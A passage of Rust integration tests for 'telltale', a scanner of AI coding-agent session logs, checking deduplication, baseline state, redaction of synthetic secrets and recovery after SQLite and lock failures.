    assert_eq!(second_summary["emitted_count"], 0);
    assert_source_processing_accounting(&second_summary);
    assert_detection_flow_accounting(&second_summary, 0, 30);
    assert_eq!(
        second_summary["detection_flow"]["matched_rule_id_count"],
        89
    );
    assert!(
        !second_summary["diagnostic_warnings"]
            .as_array()
            .expect("diagnostic warnings")
            .iter()
            .any(|warning| warning["code"] == "no_effective_detection_candidates")
    );

    let lines_before_backfill = fs::read_to_string(&log_path)
        .expect("log file before backfill")
        .lines()
        .count();
    let backfill_summary = run_scan(&["--dry-run", "--backfill"]);
    assert_eq!(backfill_summary["detection_count"], 30);
    assert_eq!(
        backfill_summary["detection_flow"]["effective_detection_candidate_count"],
        30
    );
    assert_eq!(
        backfill_summary["detection_flow"]["emitted_detection_count"],
        30
    );
    assert_eq!(
        backfill_summary["detection_flow"]["state_deduplicated_detection_count"],
        0
    );
    assert_eq!(
        fs::read_to_string(&log_path)
            .expect("log file after backfill")
            .lines()
            .count(),
        lines_before_backfill
    );

    let lines = fs::read_to_string(log_path).expect("log file");
    assert_eq!(lines.lines().count(), 32);
}

#[test]
fn repeated_telltale_scans_share_state_and_deduplicate() {
    let temp = tempdir().expect("tempdir");
    let log_path = temp.path().join("telltale-events.jsonl");
    let state_path = temp.path().join("telltale-state.json");
    let run_scan = || {
        Command::new(env!("CARGO_BIN_EXE_telltale"))
            .args([
                "scan",
                "--once",
                "--allow-fixtures",
                "--emit-activity",
                "--install-inventory-disabled",
                "--no-local-config",
                "--root",
                "tests/fixtures/session_stores",
                "--log-path",
            ])
            .arg(&log_path)
            .args(["--state-path"])
            .arg(&state_path)
            .output()
            .expect("run telltale")
    };

    let first = run_scan();
    assert!(
        first.status.success(),
        "stderr: {}",
        String::from_utf8_lossy(&first.stderr)
    );
    let first_summary: Value = serde_json::from_slice(&first.stdout).expect("first summary");
    assert!(
        first_summary["detection_count"]
            .as_u64()
            .is_some_and(|count| count > 0)
    );
    assert!(
        first_summary["activity_count"]
            .as_u64()
            .is_some_and(|count| count > 0)
    );
    assert!(
        first_summary["emitted_count"]
            .as_u64()
            .is_some_and(|count| count > 0)
    );
    let first_log = fs::read_to_string(&log_path).expect("first log");
    let first_state: Value =
        serde_json::from_str(&fs::read_to_string(&state_path).expect("first state"))
            .expect("first state json");
    let first_events = first_log
        .lines()
        .map(|line| serde_json::from_str::<Value>(line).expect("first event json"))
        .collect::<Vec<_>>();
    assert!(
        first_events
            .iter()
            .any(|event| event["event_type"] == "detection")
    );
    assert!(
        first_events
            .iter()
            .any(|event| event["event_type"] == "activity")
    );

    let status = Command::new(env!("CARGO_BIN_EXE_telltale"))
        .args(["status", "--log-path"])
        .arg(&log_path)
        .args(["--state-path"])
        .arg(&state_path)
        .output()
        .expect("run telltale status");
    assert!(
        status.status.success(),
        "status stderr: {}",
        String::from_utf8_lossy(&status.stderr)
    );
    let status_summary: Value = serde_json::from_slice(&status.stdout).expect("status json");
    assert_eq!(status_summary["status"], "ok");
    assert_eq!(status_summary["log_path"], "[sensitive-path]");
    assert_eq!(status_summary["state_path"], "[sensitive-path]");
    assert!(
        status_summary["detection_count"]
            .as_u64()
            .is_some_and(|count| count > 0)
    );

    let second = run_scan();
    assert!(
        second.status.success(),
        "stderr: {}",
        String::from_utf8_lossy(&second.stderr)
    );
    let second_summary: Value = serde_json::from_slice(&second.stdout).expect("second summary");
    assert_eq!(
        second_summary["detection_count"],
        first_summary["detection_count"]
    );
    assert_eq!(
        second_summary["activity_count"],
        first_summary["activity_count"]
    );
    assert_eq!(second_summary["emitted_count"], 0);
    assert_eq!(
        fs::read_to_string(&log_path).expect("second log"),
        first_log,
        "telltale must not duplicate first-scan telemetry"
    );
    let second_state: Value =
        serde_json::from_str(&fs::read_to_string(&state_path).expect("second state"))
            .expect("second state json");
    for field in [
        "seen_source_fingerprints",
        "seen_detection_fingerprints",
        "baseline_source_contributions",
        "baseline_snapshots",
        "sqlite_ingestion_cursors",
        "install_inventory",
    ] {
        assert_eq!(
            second_state[field], first_state[field],
            "telltale must preserve dedup state field {field}"
        );
    }
}

#[test]
fn scan_once_persists_incremental_baseline_snapshots() {
    let temp = tempdir().expect("tempdir");
    let log_path = temp.path().join("telltale-events.jsonl");
    let state_path = temp.path().join("telltale-state.json");

    let run_scan = || {
        let output = Command::new(env!("CARGO_BIN_EXE_telltale"))
            .args([
                "scan",
                "--once",
                "--allow-fixtures",
                "--root",
                "tests/fixtures/benign_baselines",
                "--log-path",
            ])
            .arg(&log_path)
            .args(["--state-path"])
            .arg(&state_path)
            .output()
            .expect("run telltale");
        assert!(
            output.status.success(),
            "stderr: {}",
            String::from_utf8_lossy(&output.stderr)
        );
        let summary: Value = serde_json::from_slice(&output.stdout).expect("scan summary");
        assert_eq!(
            summary["detection_flow"]["effective_detection_candidate_count"],
            0
        );
        let events = fs::read_to_string(&log_path).expect("benign events");
        assert!(events.lines().all(|line| {
            let event: Value = serde_json::from_str(line).expect("Event3 JSON");
            event["event_type"] != "detection"
        }));
    };

    run_scan();
    let state_after_first = fs::read_to_string(&state_path).expect("first state json");
    run_scan();
    let state_after_second = fs::read_to_string(&state_path).expect("second state json");
    let first_state: Value = serde_json::from_str(&state_after_first).expect("first state parses");
    let second_state: Value =
        serde_json::from_str(&state_after_second).expect("second state parses");
    assert_eq!(
        second_state["baseline_snapshots"], first_state["baseline_snapshots"],
        "repeat scans should not double-count baseline snapshots"
    );

    let snapshots = second_state["baseline_snapshots"]["snapshots"]
        .as_object()
        .expect("baseline snapshots");
    assert!(!snapshots.is_empty());

    let codex_records: u64 = snapshots
        .values()
        .filter(|snapshot| snapshot["key"]["client"] == "codex")
        .map(|snapshot| {
            snapshot["observations"]["records"]
                .as_u64()
                .unwrap_or_default()
        })
        .sum();
    assert!(codex_records > 0);
}

#[test]
fn scan_once_replaces_changed_source_baseline_contribution() {
    let temp = tempdir().expect("tempdir");
    let root = temp.path().join("session_store");
    let source_dir = root.join("codex/sessions");
    fs::create_dir_all(&source_dir).expect("source dir");
    let source_path = source_dir.join("append-only.jsonl");
    let log_path = temp.path().join("telltale-events.jsonl");
    let state_path = temp.path().join("telltale-state.json");

    let write_source = |tool_calls: &[(&str, &str)]| {
        let mut lines = vec![
            r#"{"type":"session_meta","session_id":"append-only","timestamp":"2026-05-17T10:00:00Z","payload":{"source":"cli","model_provider":"openai","agent_nickname":"codex-baseline-test","model":"o3"}}"#.to_string(),
            r#"{"type":"event_msg","timestamp":"2026-05-17T10:00:01Z","payload":{"type":"user_message","message":"Inspect the project files."}}"#.to_string(),
        ];
        for (index, (call_id, command)) in tool_calls.iter().enumerate() {
            lines.push(format!(
                r#"{{"type":"event_msg","timestamp":"2026-05-17T10:00:0{}Z","payload":{{"type":"tool_call","name":"shell","call_id":"{}","arguments":{{"command":"{}"}}}}}}"#,
                index + 2,
                call_id,
                command
            ));
        }
        fs::write(&source_path, format!("{}\n", lines.join("\n"))).expect("write source");
    };

    let run_scan = || {
        let output = Command::new(env!("CARGO_BIN_EXE_telltale"))
            .args([
                "scan",
                "--once",
                "--allow-fixtures",
                "--no-local-config",
                "--root",
            ])
            .arg(&root)
            .args(["--client", "codex", "--log-path"])
            .arg(&log_path)
            .args(["--state-path"])
            .arg(&state_path)
            .output()
            .expect("run telltale");
        assert!(
            output.status.success(),
            "stderr: {}",
            String::from_utf8_lossy(&output.stderr)
        );
    };

    write_source(&[("call-one", "ls src")]);
    run_scan();
    write_source(&[
        ("call-one", "ls src"),
        (
            "call-two",
            "curl https://internal.example.test/docs && cargo test --quiet",
        ),
    ]);
    run_scan();

    let state: Value = serde_json::from_str(&fs::read_to_string(&state_path).expect("state json"))
        .expect("state parses");
    let snapshot = state["baseline_snapshots"]["snapshots"]
        .as_object()
        .expect("snapshots")
        .values()
        .find(|snapshot| snapshot["key"]["client"] == "codex")
        .expect("codex snapshot");

    assert_eq!(snapshot["observations"]["tool_calls"], 2);
    assert_eq!(snapshot["tool_call_counts"]["shell"], 2);
    let state_text = fs::read_to_string(&state_path).expect("state text");
    assert!(
        !state_text.contains("internal.example.test"),
        "persisted baseline state should not contain raw network host labels"
    );
    assert!(
        state_text.contains("sha256:"),
        "persisted baseline state should contain deterministic host hashes"
    );
}

#[test]
fn scan_once_persists_distinct_source_contributions_for_same_bucket() {
    let temp = tempdir().expect("tempdir");
    let root = temp.path().join("session_store");
    let source_dir = root.join("codex/sessions/2026/05");
    fs::create_dir_all(&source_dir).expect("source dir");
    let log_path = temp.path().join("telltale-events.jsonl");
    let state_path = temp.path().join("telltale-state.json");

    for (name, command) in [
        ("session-a.jsonl", "ls src"),
        ("session-b.jsonl", "git status --short"),
    ] {
        let event = serde_json::json!({
            "type": "event_msg",
            "timestamp": "2026-05-17T10:00:02Z",
            "payload": {
                "type": "tool_call",
                "name": "shell",
                "call_id": format!("call-{name}"),
                "arguments": {"command": command}
            }
        });
        fs::write(
            source_dir.join(name),
            format!(
                "{}\n{}\n{}\n",
                serde_json::json!({"type":"session_meta","session_id":name,"timestamp":"2026-05-17T10:00:00Z","payload":{"source":"cli","model_provider":"openai","agent_nickname":"codex-baseline-test","model":"o3"}}),
                r#"{"type":"event_msg","timestamp":"2026-05-17T10:00:01Z","payload":{"type":"user_message","message":"Inspect the project files."}}"#,
                event
            ),
        )
        .expect("write source");
    }

    let output = Command::new(env!("CARGO_BIN_EXE_telltale"))
        .args([
            "scan",
            "--once",
            "--allow-fixtures",
            "--no-local-config",
            "--root",
        ])
        .arg(&root)
        .args(["--client", "codex", "--log-path"])
        .arg(&log_path)
        .args(["--state-path"])
        .arg(&state_path)
        .output()
        .expect("run telltale");
    assert!(
        output.status.success(),
        "stderr: {}",
        String::from_utf8_lossy(&output.stderr)
    );

    let state: Value = serde_json::from_str(&fs::read_to_string(&state_path).expect("state json"))
        .expect("state parses");
    let contributions = state["baseline_source_contributions"]
        .as_object()
        .expect("contributions");
    assert_eq!(contributions.len(), 2);
}

#[test]
fn scan_once_rebuild_baselines_reparses_unchanged_sources_without_reemitting_detections() {
    let temp = tempdir().expect("tempdir");
    let root = temp.path().join("session_store");
    let source_dir = root.join("codex/sessions/2026/05");
    fs::create_dir_all(&source_dir).expect("source dir");
    let source_path = source_dir.join("session-a.jsonl");
    let log_path = temp.path().join("telltale-events.jsonl");
    let state_path = temp.path().join("telltale-state.json");

    fs::write(
        &source_path,
        concat!(
            r#"{"type":"session_meta","session_id":"session-a","timestamp":"2026-05-17T10:00:00Z","payload":{"source":"cli","model_provider":"openai","agent_nickname":"codex-baseline-test","model":"o3"}}"#,
            "\n",
            r#"{"type":"event_msg","timestamp":"2026-05-17T10:00:01Z","payload":{"type":"user_message","message":"Inspect the project files."}}"#,
            "\n",
            r#"{"type":"event_msg","timestamp":"2026-05-17T10:00:02Z","payload":{"type":"tool_call","name":"shell","call_id":"call-one","arguments":{"command":"ls src"}}}"#,
            "\n"
        ),
    )
    .expect("write source");

    let run_scan = |rebuild_baselines: bool| {
        let mut command = Command::new(env!("CARGO_BIN_EXE_telltale"));
        command
            .args([
                "scan",
                "--once",
                "--allow-fixtures",
                "--no-local-config",
                "--root",
            ])
            .arg(&root)
            .args([
                "--client",
                "codex",
                "--emit-activity",
                "--install-inventory-disabled",
                "--log-path",
            ])
            .arg(&log_path)
            .args(["--state-path"])
            .arg(&state_path);
        if rebuild_baselines {
            command.arg("--rebuild-baselines");
        }
        command.output().expect("run telltale")
    };

    let first = run_scan(false);
    assert!(
        first.status.success(),
        "stderr: {}",
        String::from_utf8_lossy(&first.stderr)
    );
    let first_summary: Value = serde_json::from_slice(&first.stdout).expect("summary json");
    assert_eq!(first_summary["activity_count"], 1);
    assert_eq!(first_summary["emitted_count"], 1);

    let mut state: Value =
        serde_json::from_str(&fs::read_to_string(&state_path).expect("state json"))
            .expect("state parses");
    state["baseline_snapshots"]["snapshots"] = serde_json::json!({});
    state["baseline_source_contributions"] = serde_json::json!({});
    state["source_observations"] = serde_json::json!({});
    fs::write(
        &state_path,
        serde_json::to_string_pretty(&state).expect("serialize state"),
    )
    .expect("rewrite state");

    let rebuilt = run_scan(true);
    assert!(
        rebuilt.status.success(),
        "stderr: {}",
        String::from_utf8_lossy(&rebuilt.stderr)
    );
    let rebuilt_summary: Value = serde_json::from_slice(&rebuilt.stdout).expect("summary json");
    assert_eq!(rebuilt_summary["activity_count"], 1);
    assert_eq!(rebuilt_summary["emitted_count"], 0);

    let rebuilt_state: Value =
        serde_json::from_str(&fs::read_to_string(&state_path).expect("rebuilt state json"))
            .expect("rebuilt state parses");
    assert!(
        rebuilt_state["baseline_snapshots"]["snapshots"]
            .as_object()
            .is_some_and(|snapshots| !snapshots.is_empty())
    );
    assert!(
        rebuilt_state["baseline_source_contributions"]
            .as_object()
            .is_some_and(|contributions| contributions.len() == 1)
    );
    assert!(
        rebuilt_state["source_observations"]
            .as_object()
            .is_some_and(|observations| observations.len() == 1)
    );

    let lines = fs::read_to_string(log_path).expect("log file");
    assert_eq!(lines.lines().count(), 3);
}

#[test]
fn scan_once_can_emit_activity_events() {
    let temp = tempdir().expect("tempdir");
    let log_path = temp.path().join("telltale-events.jsonl");
    let state_path = temp.path().join("telltale-state.json");

    let output = Command::new(env!("CARGO_BIN_EXE_telltale"))
        .args([
            "scan",
            "--once",
            "--allow-fixtures",
            "--emit-activity",
            "--no-local-config",
            "--root",
            "tests/fixtures/session_stores",
            "--log-path",
        ])
        .arg(&log_path)
        .args(["--state-path"])
        .arg(&state_path)
        .output()
        .expect("run telltale");

    assert!(
        output.status.success(),
        "stderr: {}",
        String::from_utf8_lossy(&output.stderr)
    );

    let summary: Value = serde_json::from_slice(&output.stdout).expect("summary json");
    assert!(summary["activity_count"].as_u64().unwrap_or_default() > 0);
    assert_eq!(summary["detection_count"], 30);

    let lines = fs::read_to_string(log_path).expect("log file");
    let events = lines
        .lines()
        .map(|line| serde_json::from_str::<Value>(line).expect("event json"))
        .collect::<Vec<_>>();
    assert!(events.iter().any(|event| {
        event["event_type"] == "activity"
            && event["client"] == "opencode"
            && (event["severity"] == "informational" || event["severity"] == "low")
    }));
}

#[cfg(target_os = "linux")]
#[test]
fn scan_once_sqlite_admission_failure_does_not_block_valid_source() {
    let temp = tempdir().unwrap();
    let root = temp.path().join("synthetic-home");
    let opencode = root.join("opencode");
    let codex = root.join("codex/sessions/2026/05");
    fs::create_dir_all(&opencode).unwrap();
    fs::create_dir_all(&codex).unwrap();
    let marker = "SYNTHETIC-ADMISSION-PRIVATE-MARKER";
    let conn = Connection::open(opencode.join("opencode.db")).unwrap();
    conn.execute_batch("create table message(id text,session_id text,data text,unknown blob); insert into message values('m','s','{}',zeroblob(8388609));").unwrap();
    fs::write(codex.join("valid.jsonl"), format!("{}\n{}\n",
        serde_json::json!({"type":"session_meta","session_id":"synthetic-valid-session","timestamp":"2026-05-17T10:00:00Z","payload":{"source":"cli","model_provider":"openai","agent_nickname":"synthetic","model":"o3"}}),
        serde_json::json!({"type":"event_msg","timestamp":"2026-05-17T10:00:01Z","payload":{"type":"user_message","message":format!("Inspect synthetic files api_key={marker}")}}))).unwrap();
    let log = temp.path().join("events.jsonl");
    let state = temp.path().join("state.json");
    let output = Command::new(env!("CARGO_BIN_EXE_telltale"))
        .env_clear()
        .env("HOME", &root)
        .env("XDG_CONFIG_HOME", root.join(".config"))
        .env("XDG_DATA_HOME", root.join(".local/share"))
        .env("XDG_STATE_HOME", root.join(".local/state"))
        .env("XDG_CACHE_HOME", root.join(".cache"))
        .current_dir(temp.path())
        .args([
            "scan",
            "--once",
            "--allow-fixtures",
            "--emit-activity",
            "--no-local-config",
            "--install-inventory-disabled",
            "--root",
        ])
        .arg(&root)
        .args(["--log-path"])
        .arg(&log)
        .args(["--state-path"])
        .arg(&state)
        .output()
        .unwrap();
    assert!(
        output.status.success(),
        "{}",
        String::from_utf8_lossy(&output.stderr)
    );
    let summary: Value = serde_json::from_slice(&output.stdout).unwrap();
    assert_eq!(summary["source_processing"]["parse_error_source_count"], 1);
    assert!(
        summary["source_processing"]["parsed_record_count"]
            .as_u64()
            .unwrap()
            > 0
    );
    let saved: Value = serde_json::from_slice(&fs::read(&state).unwrap()).unwrap();
    assert!(
        saved["sqlite_ingestion_cursors"]
            .as_object()
            .unwrap()
            .is_empty()
    );
    assert!(
        saved["baseline_source_contributions"]
            .as_object()
            .unwrap()
            .values()
            .any(|entry| entry["source_id"] == "codex.sessions")
    );
    let persisted = fs::read_to_string(&log).unwrap();
    let events: Vec<Value> = persisted
        .lines()
        .map(|line| serde_json::from_str(line).unwrap())
        .collect();
    assert!(
        events
            .iter()
            .any(|event| event["event_type"] == "scanner_error" && event["client"] == "opencode")
    );
    assert!(
        events
            .iter()
            .any(|event| event["event_type"] == "activity" && event["client"] == "codex")
    );
    for text in [
        String::from_utf8_lossy(&output.stdout).into_owned(),
        String::from_utf8_lossy(&output.stderr).into_owned(),
        persisted,
        fs::read_to_string(state).unwrap(),
    ] {
        assert!(!text.contains(marker));
        assert!(!text.contains("admission_unknown"));
    }
}

#[cfg(target_os = "linux")]
#[test]
fn scan_once_persists_opencode_cursor_and_replays_recovery_after_failures() {
    let temp = tempdir().expect("tempdir");
    let secret = "SYNTHETIC-RECOVERY-SECRET";
    let schema: Value =
        serde_json::from_str(include_str!("../../schemas/event.schema.json")).unwrap();
    let validator = validator_for(&schema).unwrap();
    let rules_path = temp.path().join("recovery-rule.yaml");
    fs::write(
        &rules_path,
        r#"
version: 1
description: Synthetic page-two recovery test.
defaults: { case_insensitive: false, enabled: true }
modifiers: []
rules:
  - id: synthetic.recovery.page_two
    title: Synthetic recovery marker
    tags: [synthetic]
    category: synthetic
    severity: high
    score: 70
    detection:
      selection:
        assistant_context: 'synthetic-page-two-security-marker'
      condition: selection
    explanation: Synthetic persisted recovery evidence.
"#,
    )
    .unwrap();
    let root = temp.path().join("home");
    let opencode_dir = root.join(".local/share/opencode");
    fs::create_dir_all(&opencode_dir).expect("opencode dir");
    let db_path = opencode_dir.join("opencode.db");
    let conn = Connection::open(&db_path).expect("open db");
    conn.execute_batch(
        "create table message (
            id text primary key,
            session_id text not null,
            time_created integer not null,
            time_updated integer not null,
            data text not null
        );
        create table part (
            id text primary key,
            message_id text not null,
            session_id text not null,
            time_created integer not null,
            time_updated integer not null,
            data text not null
        );",
    )
    .expect("schema");
    conn.execute(
        "insert into message (id, session_id, time_created, time_updated, data)
         values (?1, ?2, ?3, ?4, ?5)",
        (
            "message-a",
            "session-a",
            1_775_000_000_000_i64,
            1_775_000_000_000_i64,
            serde_json::json!({"role": "assistant"}).to_string(),
        ),
    )
    .expect("insert message");
    conn.execute(
        "insert into part (id, message_id, session_id, time_created, time_updated, data)
         values (?1, ?2, ?3, ?4, ?5, ?6)",
        (
            "part-a",
            "message-a",
            "session-a",
            1_775_000_001_000_i64,
            1_775_000_001_000_i64,
            serde_json::json!({"type": "text", "text": format!("benign assistant response api_key={secret}")}).to_string(),
        ),
    )
    .expect("insert part");
    drop(conn);

    let log_path = temp.path().join("telltale-events.jsonl");
    let state_path = temp.path().join("telltale-state.json");
    let scan = || {
        let output = Command::new(env!("CARGO_BIN_EXE_telltale"))
            .env_clear()
            .env("HOME", &root)
            .env("XDG_CONFIG_HOME", root.join(".config"))
            .env("XDG_DATA_HOME", root.join(".local/share"))
            .env("XDG_STATE_HOME", root.join(".local/state"))
            .env("XDG_CACHE_HOME", root.join(".cache"))
            .current_dir(temp.path())
            .args([
                "scan",
                "--once",
                "--emit-activity",
                "--no-local-config",
                "--install-inventory-disabled",
                "--client",
                "opencode",
                "--root",
            ])
            .arg(&root)
            .args(["--no-default-rules", "--rules"])
            .arg(&rules_path)
            .args(["--log-path"])
            .arg(&log_path)
            .args(["--state-path"])
            .arg(&state_path)
            .output()
            .expect("run telltale");
        for bytes in [&output.stdout, &output.stderr] {
            assert!(!String::from_utf8_lossy(bytes).contains(secret));
        }
        if state_path.is_file() {
            assert!(!fs::read_to_string(&state_path).unwrap().contains(secret));
        }
        if log_path.is_file() {
            let persisted = fs::read_to_string(&log_path).unwrap();
            assert!(!persisted.contains(secret));
            for line in persisted.lines() {
                let event: Value = serde_json::from_str(line).unwrap();
                assert_eq!(event["schema_version"], "3.0");
                assert!(validator.is_valid(&event), "invalid Event3: {event}");
            }
        }
        output
    };
    let output = scan();

    assert!(
        output.status.success(),
        "stderr: {}",
        String::from_utf8_lossy(&output.stderr)
    );
    let summary: Value = serde_json::from_slice(&output.stdout).expect("summary json");
    assert_eq!(summary["source_counts"]["opencode.sqlite"], 1);

    let state: Value = serde_json::from_str(&fs::read_to_string(&state_path).expect("state file"))
        .expect("state json");
    let cursors = state["sqlite_ingestion_cursors"]
        .as_object()
        .expect("sqlite cursors");
    assert_eq!(cursors.len(), 1);
    let cursor = cursors.values().next().expect("cursor");
    assert_eq!(cursor["table"], "part");
    assert_eq!(cursor["last_time_updated"], 1_775_000_001_000_i64);
    // SQLite acquisition is explicitly partial-source coverage, so it must not
    // install complete-source baseline contributions, even on successful scans.
    assert!(
        state["baseline_source_contributions"]
            .as_object()
            .unwrap()
            .is_empty()
    );
    // Quiesced coordinated backup; all subprocesses have exited. This is a
    // same-development-revision restore, not binary downgrade qualification.
    let backup = temp.path().join("backup");
    fs::create_dir(&backup).unwrap();
    let backup_state = backup.join("state.json");
    let backup_log = backup.join("events.jsonl");
    fs::copy(&state_path, &backup_state).unwrap();
    fs::copy(&log_path, &backup_log).unwrap();
    let baseline_log = fs::read(&backup_log).unwrap();

    // A projected unknown column is admission scope even though mapping ignores it.
    let admission_writer = Connection::open(&db_path).unwrap();
    admission_writer.execute_batch("alter table part add column admission_unknown blob; update part set admission_unknown=zeroblob(8388609);").unwrap();
    let oversized = scan();
    assert!(
        oversized.status.success(),
        "source failure remains a scanner event"
    );
    let summary: Value = serde_json::from_slice(&oversized.stdout).unwrap();
    assert_eq!(summary["source_processing"]["parse_error_source_count"], 1);
    assert_eq!(summary["activity_count"], 0);
    let after_admission: Value = serde_json::from_slice(&fs::read(&state_path).unwrap()).unwrap();
    for key in [
        "sqlite_ingestion_cursors",
        "baseline_source_contributions",
        "baseline_snapshots",
    ] {
        assert_eq!(
            after_admission[key], state[key],
            "admission failure replaced {key}"
        );
    }
    let admission_log = fs::read(&log_path).unwrap();
    let errors: Vec<Value> = std::str::from_utf8(&admission_log[baseline_log.len()..])
        .unwrap()
        .lines()
        .map(|line| serde_json::from_str(line).unwrap())
        .collect();
    assert!(
        errors
            .iter()
            .any(|event| event["event_type"] == "scanner_error")
    );
    assert!(
        !errors
            .iter()
            .any(|event| event["event_type"] == "activity" || event["event_type"] == "detection")
    );
    // Repair and restart through a new process; keep the existing test's schema.
    admission_writer
        .execute_batch("alter table part drop column admission_unknown")
        .unwrap();
    drop(admission_writer);
    assert!(scan().status.success());
    let state: Value = serde_json::from_slice(&fs::read(&state_path).unwrap()).unwrap();

    let mut writer = Connection::open(&db_path).unwrap();
    let tx = writer.transaction().unwrap();
    for i in 0..5000 {
        tx.execute("insert into part values (?1,'message-a','session-a',1775000002000,1775000002000,'{\"type\":\"text\",\"text\":\"synthetic recovery\"}')", [format!("extra-{i}")]).unwrap();
    }
    tx.commit().unwrap();
    writer
        .execute(
            "update part set data=?1 where id='extra-0'",
            [serde_json::json!({"type": "text", "text": format!("synthetic-page-two-security-marker api_key={secret}")}).to_string()],
        )
        .unwrap();
    writer
        .execute(
            "update part set data=?1 where id='extra-4999'",
            [
                serde_json::json!({"type": "text", "text": format!("synthetic-page-two-security-marker api_key={secret}")})
                    .to_string(),
            ],
        )
        .unwrap();
    writer
        .execute(
            "update part set time_updated='invalid' where id='extra-4999'",
            [],
        )
        .unwrap();
    let malformed = scan();
    assert!(
        malformed.status.success(),
        "source errors remain scanner events"
    );
    let summary: Value = serde_json::from_slice(&malformed.stdout).unwrap();
    assert_eq!(summary["source_processing"]["parse_error_source_count"], 1);
    let after_error: Value = serde_json::from_slice(&fs::read(&state_path).unwrap()).unwrap();
    for key in [
        "sqlite_ingestion_cursors",
        "baseline_source_contributions",
        "baseline_snapshots",
    ] {
        assert_eq!(
            after_error[key], state[key],
            "partial source committed {key}"
        );
    }
    assert_eq!(summary["activity_count"], 0);
    let failed_log = fs::read(&log_path).unwrap();
    assert!(failed_log.starts_with(&baseline_log));
    let late_events = std::str::from_utf8(&failed_log[baseline_log.len()..])
        .unwrap()
        .lines()
        .map(|line| serde_json::from_str::<Value>(line).unwrap())
        .collect::<Vec<_>>();
    assert!(
        late_events
            .iter()
            .any(|event| event["event_type"] == "scanner_error")
    );
    assert!(
        !late_events.iter().any(|event| {
            event["event_type"] == "detection" || event["event_type"] == "activity"
        })
    );
    writer
        .execute(
            "update part set time_updated=1775000002000 where id='extra-4999'",
            [],
        )
        .unwrap();
    let before_output_failure = fs::read(&state_path).unwrap();
    // Valid paths pass preflight. JSONL takes this advisory lock only when
    // emitting nonempty output, after acquisition and atomic state preparation.
    let log_lock = fs::OpenOptions::new()
        .read(true)
        .write(true)
        .open(log_path.with_file_name("telltale-events.jsonl.lock"))
        .expect("existing JSONL sidecar");
    fs4::FileExt::lock(&log_lock).expect("hold exclusive JSONL lock before scan");
    let failed = scan();
    assert!(!failed.status.success());
    assert!(
        failed.stdout.is_empty(),
        "failed emission must not return a summary"
    );
    assert!(
        String::from_utf8_lossy(&failed.stderr).contains("resource busy; retry later"),
        "expected sink lock contention, stderr: {}",
        String::from_utf8_lossy(&failed.stderr)
    );
    assert_eq!(fs::read(&state_path).unwrap(), before_output_failure);
    assert_eq!(fs::read(&log_path).unwrap(), failed_log);
    fs4::FileExt::unlock(&log_lock).unwrap();
    drop(log_lock);
    let restarted = scan();
    assert!(
        restarted.status.success(),
        "{}",
        String::from_utf8_lossy(&restarted.stderr)
    );
    let summary: Value = serde_json::from_slice(&restarted.stdout).unwrap();
    assert_eq!(summary["source_processing"]["parsed_record_count"], 5002);
    assert_eq!(summary["source_processing"]["parse_error_source_count"], 0);
    let events: Vec<Value> = fs::read_to_string(&log_path)
        .unwrap()
        .lines()
        .map(|line| serde_json::from_str(line).unwrap())
        .collect();
    let detections = events
        .iter()
        .filter(|event| {
            event["event_type"] == "detection"
                && event["client"] == "opencode"
                && event["session_id"] == "session-a"
                && event["rule_ids"].as_array().is_some_and(|ids| {
                    ids.contains(&Value::String("synthetic.recovery.page_two".to_owned()))
                })
        })
        .collect::<Vec<_>>();
    assert_eq!(
        detections.len(),
        1,
        "recovery detection must persist exactly once"
    );
    assert_eq!(
        detections[0]["timeline_anchors"].as_array().unwrap().len(),
        2,
        "both early and late matching parts must survive recovery"
    );
    let recovered_activities = events
        .iter()
        .filter(|event| event["event_type"] == "activity")
        .count();
    assert_eq!(
        recovered_activities, 2,
        "baseline and recovery activity must persist"
    );
    let recovered_log = fs::read(&log_path).unwrap();
    assert!(recovered_log.starts_with(&failed_log));
    let recovered: Value = serde_json::from_slice(&fs::read(&state_path).unwrap()).unwrap();
    assert_eq!(
        recovered["sqlite_ingestion_cursors"]
            .as_object()
            .unwrap()
            .values()
            .next()
            .unwrap()["last_time_updated"],
        1_775_000_002_000_i64
    );
    let repeated = scan();
    assert!(repeated.status.success());
    let summary: Value = serde_json::from_slice(&repeated.stdout).unwrap();
    assert_eq!(summary["source_processing"]["parse_error_source_count"], 0);
    assert_eq!(
        fs::read(&log_path).unwrap(),
        recovered_log,
        "restart duplicated events"
    );

    // Preserve the post-recovery set before restoring both baseline artifacts.
    // The source remains ahead of the restored cursor and is replayed by the
    // exact same binary, without deleting state or using backfill.
    let quarantine = temp.path().join("post-recovery");
    fs::create_dir(&quarantine).unwrap();
    fs::copy(&state_path, quarantine.join("state.json")).unwrap();
    fs::copy(&log_path, quarantine.join("events.jsonl")).unwrap();
    fs::copy(&backup_state, &state_path).unwrap();
    fs::copy(&backup_log, &log_path).unwrap();
    assert_eq!(
        fs::read(&state_path).unwrap(),
        fs::read(&backup_state).unwrap()
    );
    assert_eq!(fs::read(&log_path).unwrap(), baseline_log);
    let restored = scan();
    assert!(restored.status.success());
    let summary: Value = serde_json::from_slice(&restored.stdout).unwrap();
    assert_eq!(summary["source_processing"]["parsed_record_count"], 5002);
    assert_eq!(summary["source_processing"]["parse_error_source_count"], 0);
    let restored_state: Value = serde_json::from_slice(&fs::read(&state_path).unwrap()).unwrap();
    let restored_cursors = restored_state["sqlite_ingestion_cursors"]
        .as_object()
        .unwrap();
    let recovered_cursors = recovered["sqlite_ingestion_cursors"].as_object().unwrap();
    assert_eq!(restored_cursors.len(), recovered_cursors.len());
    for (coordinate, cursor) in recovered_cursors {
        // Observation time is deliberately refreshed by the replay subprocess.
        for key in [
            "client",
            "source_id",
            "source_instance_id",
            "table",
            "last_time_updated",
        ] {
            assert_eq!(restored_cursors[coordinate][key], cursor[key]);
        }
    }
    assert_eq!(
        restored_state["baseline_source_contributions"],
        recovered["baseline_source_contributions"]
    );
    let restored_log = fs::read(&log_path).unwrap();
    assert!(restored_log.starts_with(&baseline_log));
    let replayed_events = std::str::from_utf8(&restored_log[baseline_log.len()..])
        .unwrap()
        .lines()
        .map(|line| serde_json::from_str::<Value>(line).unwrap())
        .collect::<Vec<_>>();
    let replayed_detections = replayed_events
        .iter()
        .filter(|event| event["event_type"] == "detection")
        .collect::<Vec<_>>();
    assert_eq!(replayed_detections.len(), 1);
    assert_eq!(
        replayed_events
            .iter()
            .filter(|event| event["event_type"] == "activity")
            .count(),
        1
    );
    for key in [
        "rule_ids",
        "session_id",
        "risk_score",
        "evidence",
        "timeline_anchors",
    ] {
        assert_eq!(
            replayed_detections[0][key], detections[0][key],
            "restore lost detection {key}"
        );
    }
    assert!(scan().status.success());
    assert_eq!(
        fs::read(&log_path).unwrap(),
        restored_log,
        "restored restart duplicated events"
    );
}

#[test]
